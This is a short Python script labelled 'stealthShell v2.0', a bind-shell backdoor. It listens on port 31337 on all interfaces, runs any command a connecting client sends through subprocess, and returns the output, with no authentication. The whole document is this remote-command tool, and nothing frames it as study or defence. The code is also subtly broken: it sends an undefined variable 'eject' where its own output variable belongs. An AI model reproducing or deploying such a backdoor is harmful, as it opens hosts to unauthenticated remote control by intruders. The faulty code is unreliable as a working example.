#!/usr/bin/python

# stealthShell v2.0, Author @guguvk (Axel González)

import socket, subprocess, signal

signal.signal(signal.SIGINT, signal.SIG_DFL)

address = "0.0.0.0"
with socket.socket() as s:
    s.bind((address, 31337))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen()

    client, add = s.accept()

    while True:
        command = client.recv(4090).decode()
        if not command:
            break
        if command.lower() == "exit":
            break
        else:
            try:
                output = subprocess.getoutput(command) + "\n"
            except Exception as e:
                print(f"\n!!Error {e}")

            client.send(eject.encode())

    client.close()

